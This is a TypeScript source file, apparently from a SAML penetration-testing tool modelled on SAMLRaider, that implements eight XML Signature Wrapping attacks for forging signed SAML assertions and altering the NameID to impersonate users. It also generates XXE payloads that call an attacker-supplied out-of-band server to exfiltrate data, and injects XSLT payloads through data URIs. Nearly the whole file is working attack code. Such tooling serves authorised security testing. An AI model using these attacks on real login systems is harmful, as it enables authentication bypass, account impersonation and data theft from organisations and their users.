/**
 * XSW attacks based on the original SAMLRaider implementation
 * Reference: https://github.com/CompassSecurity/SAMLRaider
 * Paper: "On Breaking SAML: Be Whoever You Want to Be"
 * 
 * XSW1-2: Response-level wrapping attacks
 * XSW3-8: Assertion-level wrapping attacks
 */

export interface XSWResult {
  success: boolean;
  xml?: string;
  error?: string;
}

export class SAMLAttacks {
  /**
   * Extract Response element info
   */
  private static extractResponse(xml: string): { 
    response: string; 
    startIndex: number; 
    endIndex: number;
    prefix: string;
    id: string;
  } | null {
    // Match Response with any namespace prefix
    const match = xml.match(/<([a-zA-Z0-9]*:)?Response([^>]*?)>([\s\S]*?)<\/\1?Response>/i);
    if (!match) return null;
    
    const idMatch = match[2].match(/ID="([^"]+)"/i);
    return {
      response: match[0],
      startIndex: match.index!,
      endIndex: match.index! + match[0].length,
      prefix: match[1] || '',
      id: idMatch ? idMatch[1] : ''
    };
  }

  /**
   * Extract Assertion element info
   */
  private static extractAssertion(xml: string): { 
    assertion: string; 
    startIndex: number;
    endIndex: number;
    prefix: string; 
    id: string;
  } | null {
    // Match Assertion with any namespace prefix - use greedy matching for nested content
    const match = xml.match(/<([a-zA-Z0-9]*:)?Assertion\b([^>]*?)>([\s\S]*?)<\/\1?Assertion>/i);
    if (!match) return null;
    
    const idMatch = match[2].match(/ID="([^"]+)"/i);
    return {
      assertion: match[0],
      startIndex: match.index!,
      endIndex: match.index! + match[0].length,
      prefix: match[1] || '',
      id: idMatch ? idMatch[1] : ''
    };
  }

  /**
   * Extract Signature element info
   */
  private static extractSignature(xml: string): { 
    signature: string; 
    startIndex: number;
    endIndex: number;
    prefix: string;
  } | null {
    const match = xml.match(/<([a-zA-Z0-9]*:)?Signature\b[^>]*>([\s\S]*?)<\/\1?Signature>/i);
    if (!match) return null;
    return {
      signature: match[0],
      startIndex: match.index!,
      endIndex: match.index! + match[0].length,
      prefix: match[1] || ''
    };
  }

  /**
   * Remove Signature from an element string
   */
  private static removeSignature(element: string): string {
    return element.replace(/<([a-zA-Z0-9]*:)?Signature\b[^>]*>[\s\S]*?<\/\1?Signature>/gi, '');
  }

  /**
   * Change the ID attribute of an element to mark it as evil
   */
  private static setEvilId(element: string, newId: string): string {
    return element.replace(/ID="[^"]*"/i, `ID="${newId}"`);
  }

  /**
   * Apply match and replace for evil assertion (modify NameID value)
   */
  private static applyEvilModification(element: string): string {
    // Modify NameID value to indicate evil assertion
    return element.replace(
      /(<([a-zA-Z0-9]*:)?NameID[^>]*>)([^<]*)(<\/\2?NameID>)/gi,
      '$1evil-$3$4'
    );
  }

  /**
   * Find position after Response opening tag
   */
  private static findAfterResponseOpen(xml: string): number {
    const match = xml.match(/<([a-zA-Z0-9]*:)?Response\b[^>]*>/i);
    if (!match) return -1;
    return match.index! + match[0].length;
  }

  /**
   * XSW1: Clone Response, put original Signature inside cloned Response
   * The original Response becomes evil, cloned Response (with signature) is nested inside Signature
   */
  private static applyXSW1(xml: string): XSWResult {
    const responseInfo = this.extractResponse(xml);
    if (!responseInfo) {
      return { success: false, error: "No Response element found" };
    }

    const sigInfo = this.extractSignature(xml);
    if (!sigInfo) {
      return { success: false, error: "No Signature element found for XSW1" };
    }

    // Clone the response
    let clonedResponse = responseInfo.response;
    // Remove signature from cloned response
    clonedResponse = this.removeSignature(clonedResponse);

    // Modify original response (make it evil)
    let evilResponse = this.applyEvilModification(responseInfo.response);
    evilResponse = this.setEvilId(evilResponse, '_evil_response_ID');

    // Insert cloned response inside the signature element (before closing tag)
    const sigPrefix = sigInfo.prefix || 'ds:';
    const sigClosingTag = `</${sigPrefix}Signature>`;
    const newSignature = sigInfo.signature.replace(
      new RegExp(`</${sigPrefix.replace(':', '\\:')}?Signature>`, 'i'),
      clonedResponse + sigClosingTag
    );

    // Replace original signature with new signature containing cloned response
    let result = evilResponse.replace(sigInfo.signature, newSignature);
    
    return { success: true, xml: result };
  }

  /**
   * XSW2: Clone Response, insert before Signature (detached signature style)
   * The original Response becomes evil, cloned Response is inserted before Signature
   */
  private static applyXSW2(xml: string): XSWResult {
    const responseInfo = this.extractResponse(xml);
    if (!responseInfo) {
      return { success: false, error: "No Response element found" };
    }

    const sigInfo = this.extractSignature(xml);
    if (!sigInfo) {
      return { success: false, error: "No Signature element found for XSW2" };
    }

    // Clone the response and remove its signature
    let clonedResponse = this.removeSignature(responseInfo.response);

    // Modify original response (make it evil)
    let result = this.applyEvilModification(xml);
    result = this.setEvilId(result, '_evil_response_ID');

    // Insert cloned response before the signature
    result = result.slice(0, sigInfo.startIndex) + clonedResponse + result.slice(sigInfo.startIndex);

    return { success: true, xml: result };
  }

  /**
   * XSW3: Clone Assertion, insert evil clone before original
   * Evil assertion is inserted as first child of Response
   */
  private static applyXSW3(xml: string): XSWResult {
    const assertionInfo = this.extractAssertion(xml);
    if (!assertionInfo) {
      return { success: false, error: "No SAML Assertion found in the XML" };
    }

    // Create evil assertion (clone without signature, with evil ID)
    let evilAssertion = this.removeSignature(assertionInfo.assertion);
    evilAssertion = this.setEvilId(evilAssertion, '_evil_assertion_ID');
    evilAssertion = this.applyEvilModification(evilAssertion);

    // Insert evil assertion before original assertion
    const result = xml.slice(0, assertionInfo.startIndex) + 
                   evilAssertion + 
                   xml.slice(assertionInfo.startIndex);

    return { success: true, xml: result };
  }

  /**
   * XSW4: Clone Assertion, original becomes child of evil assertion
   * Evil assertion wraps the original assertion
   */
  private static applyXSW4(xml: string): XSWResult {
    const assertionInfo = this.extractAssertion(xml);
    if (!assertionInfo) {
      return { success: false, error: "No SAML Assertion found in the XML" };
    }

    // Create evil assertion wrapper
    let evilAssertion = this.removeSignature(assertionInfo.assertion);
    evilAssertion = this.setEvilId(evilAssertion, '_evil_assertion_ID');
    evilAssertion = this.applyEvilModification(evilAssertion);

    // Find closing tag of evil assertion and insert original before it
    const prefix = assertionInfo.prefix || 'saml:';
    const closingTag = `</${prefix}Assertion>`;
    const closingTagAlt = `</Assertion>`;
    
    let wrappedAssertion: string;
    if (evilAssertion.includes(closingTag)) {
      wrappedAssertion = evilAssertion.replace(closingTag, assertionInfo.assertion + closingTag);
    } else {
      wrappedAssertion = evilAssertion.replace(closingTagAlt, assertionInfo.assertion + closingTagAlt);
    }

    // Replace original assertion with wrapped version
    const result = xml.slice(0, assertionInfo.startIndex) + 
                   wrappedAssertion + 
                   xml.slice(assertionInfo.endIndex);

    return { success: true, xml: result };
  }

  /**
   * XSW5: Original assertion becomes evil, clone appended to Response
   * Evil assertion stays in place, clean copy appended at end
   */
  private static applyXSW5(xml: string): XSWResult {
    const assertionInfo = this.extractAssertion(xml);
    if (!assertionInfo) {
      return { success: false, error: "No SAML Assertion found in the XML" };
    }

    // Clone assertion and remove signature
    let clonedAssertion = this.removeSignature(assertionInfo.assertion);

    // Make original assertion evil
    let result = this.setEvilId(xml, '_evil_assertion_ID');
    result = this.applyEvilModification(result);

    // Find Response closing tag and insert cloned assertion before it
    const responseCloseMatch = result.match(/<\/([a-zA-Z0-9]*:)?Response>/i);
    if (!responseCloseMatch) {
      return { success: false, error: "No Response closing tag found" };
    }
    
    const insertPos = result.lastIndexOf(responseCloseMatch[0]);
    result = result.slice(0, insertPos) + clonedAssertion + result.slice(insertPos);

    return { success: true, xml: result };
  }

  /**
   * XSW6: Clone assertion inside Signature element
   * Evil assertion stays in place, clean copy nested inside Signature
   */
  private static applyXSW6(xml: string): XSWResult {
    const assertionInfo = this.extractAssertion(xml);
    if (!assertionInfo) {
      return { success: false, error: "No SAML Assertion found in the XML" };
    }

    const sigInfo = this.extractSignature(xml);
    if (!sigInfo) {
      return { success: false, error: "No Signature element found for XSW6" };
    }

    // Clone assertion and remove signature
    let clonedAssertion = this.removeSignature(assertionInfo.assertion);

    // Make original assertion evil
    let result = this.setEvilId(xml, '_evil_assertion_ID');
    result = this.applyEvilModification(result);

    // Re-extract signature from modified XML
    const newSigInfo = this.extractSignature(result);
    if (!newSigInfo) {
      return { success: false, error: "Signature lost during modification" };
    }

    // Insert cloned assertion inside signature (before closing tag)
    const sigPrefix = newSigInfo.prefix || 'ds:';
    const sigClosingTag = new RegExp(`</${sigPrefix.replace(':', '\\:')}?Signature>`, 'i');
    const newSignature = newSigInfo.signature.replace(
      sigClosingTag,
      clonedAssertion + `</${sigPrefix}Signature>`
    );

    result = result.replace(newSigInfo.signature, newSignature);

    return { success: true, xml: result };
  }

  /**
   * XSW7: Evil assertion wrapped in Extensions element before original
   * Uses Extensions element which has less restrictive schema
   */
  private static applyXSW7(xml: string): XSWResult {
    const assertionInfo = this.extractAssertion(xml);
    if (!assertionInfo) {
      return { success: false, error: "No SAML Assertion found in the XML" };
    }

    // Create evil assertion
    let evilAssertion = this.removeSignature(assertionInfo.assertion);
    evilAssertion = this.setEvilId(evilAssertion, '_evil_assertion_ID');
    evilAssertion = this.applyEvilModification(evilAssertion);

    // Wrap in Extensions element
    const extensions = `<Extensions>${evilAssertion}</Extensions>`;

    // Insert Extensions before original assertion
    const result = xml.slice(0, assertionInfo.startIndex) + 
                   extensions + 
                   xml.slice(assertionInfo.startIndex);

    return { success: true, xml: result };
  }

  /**
   * XSW8: Clone assertion wrapped in Object element inside Signature
   * Uses Object element inside Signature which has less restrictive schema
   */
  private static applyXSW8(xml: string): XSWResult {
    const assertionInfo = this.extractAssertion(xml);
    if (!assertionInfo) {
      return { success: false, error: "No SAML Assertion found in the XML" };
    }

    const sigInfo = this.extractSignature(xml);
    if (!sigInfo) {
      return { success: false, error: "No Signature element found for XSW8" };
    }

    // Clone assertion and remove signature
    let clonedAssertion = this.removeSignature(assertionInfo.assertion);

    // Make original assertion evil
    let result = this.setEvilId(xml, '_evil_assertion_ID');
    result = this.applyEvilModification(result);

    // Re-extract signature from modified XML
    const newSigInfo = this.extractSignature(result);
    if (!newSigInfo) {
      return { success: false, error: "Signature lost during modification" };
    }

    // Wrap cloned assertion in Object element
    const objectElement = `<ds:Object>${clonedAssertion}</ds:Object>`;

    // Insert Object inside signature (before closing tag)
    const sigPrefix = newSigInfo.prefix || 'ds:';
    const sigClosingTag = new RegExp(`</${sigPrefix.replace(':', '\\:')}?Signature>`, 'i');
    const newSignature = newSigInfo.signature.replace(
      sigClosingTag,
      objectElement + `</${sigPrefix}Signature>`
    );

    result = result.replace(newSigInfo.signature, newSignature);

    return { success: true, xml: result };
  }

  /**
   * Apply XSW attack variant (1-8)
   */
  static applyXSW(xml: string, variant: number): XSWResult {
    try {
      switch (variant) {
        case 1: return this.applyXSW1(xml);
        case 2: return this.applyXSW2(xml);
        case 3: return this.applyXSW3(xml);
        case 4: return this.applyXSW4(xml);
        case 5: return this.applyXSW5(xml);
        case 6: return this.applyXSW6(xml);
        case 7: return this.applyXSW7(xml);
        case 8: return this.applyXSW8(xml);
        default:
          return {
            success: false,
            error: `XSW variant ${variant} is not supported. Valid variants are 1-8.`,
          };
      }
    } catch (error: any) {
      return {
        success: false,
        error: `Error applying XSW attack: ${error.message || String(error)}`,
      };
    }
  }

  /**
   * Apply XXE payload to XML
   * Accepts an OOB server URL and generates the XXE payload automatically
   */
  static applyXXE(xml: string, serverUrl: string): string {
    // Clean up the URL
    const url = serverUrl.trim();
    
    // Generate standard XXE payload with parameter entity for OOB exfiltration
    const dtd = `<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "${url}">
  %xxe;
]>`;
    
    // Check if XML declaration exists
    const xmlDeclMatch = xml.match(/^(\s*<\?xml[^?]*\?>\s*)/i);
    
    if (xmlDeclMatch) {
      // Insert after XML declaration
      return xmlDeclMatch[1] + dtd + xml.slice(xmlDeclMatch[0].length);
    } else {
      // Prepend DOCTYPE
      return dtd + xml;
    }
  }

  /**
   * Apply XSLT payload to XML
   * Inserts xml-stylesheet processing instruction with XSLT payload
   * The payload is embedded as a data URI
   */
  static applyXSLT(xml: string, payload: string): string {
    // Base64 encode the payload manually (btoa may not be available)
    let base64Payload: string;
    try {
      // Try using btoa if available
      if (typeof btoa === 'function') {
        base64Payload = btoa(payload);
      } else {
        // Manual base64 encoding fallback
        base64Payload = this.base64Encode(payload);
      }
    } catch {
      // Fallback to manual encoding
      base64Payload = this.base64Encode(payload);
    }

    // Build the processing instruction
    const pi = `<?xml-stylesheet type="text/xsl" href="data:text/xml;base64,${base64Payload}"?>`;
    
    // Check if XML declaration exists
    const xmlDeclMatch = xml.match(/^(\s*<\?xml[^?]*\?>\s*)/i);
    
    if (xmlDeclMatch) {
      // Insert after XML declaration
      return xmlDeclMatch[1] + '\n' + pi + '\n' + xml.slice(xmlDeclMatch[0].length);
    } else {
      // Prepend processing instruction
      return pi + '\n' + xml;
    }
  }

  /**
   * Manual base64 encoding (fallback when btoa is not available)
   */
  private static base64Encode(str: string): string {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
    let result = '';
    let i = 0;
    
    while (i < str.length) {
      const a = str.charCodeAt(i++);
      const b = i < str.length ? str.charCodeAt(i++) : 0;
      const c = i < str.length ? str.charCodeAt(i++) : 0;
      
      const triplet = (a << 16) | (b << 8) | c;
      
      result += chars[(triplet >> 18) & 0x3f];
      result += chars[(triplet >> 12) & 0x3f];
      result += i > str.length + 1 ? '=' : chars[(triplet >> 6) & 0x3f];
      result += i > str.length ? '=' : chars[triplet & 0x3f];
    }
    
    return result;
  }
}
